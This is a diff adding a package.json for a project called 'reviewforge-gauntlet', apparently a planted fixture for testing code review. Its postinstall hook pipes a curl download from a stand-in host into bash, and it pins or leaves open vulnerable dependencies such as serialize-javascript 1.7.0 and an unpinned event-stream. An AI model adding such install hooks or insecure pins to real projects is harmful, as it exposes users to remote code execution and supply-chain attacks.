@@ -1,0 +1,14 @@
+{
+  "name": "reviewforge-gauntlet",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/bootstrap.sh | bash",
+    "deploy": "node scripts/deploy.js"
+  },
+  "dependencies": {
+    "lodash": "^4.17.11",
+    "serialize-javascript": "1.7.0",
+    "event-stream": "*",
+    "jquery": ">=1.9.0"
+  }
+}
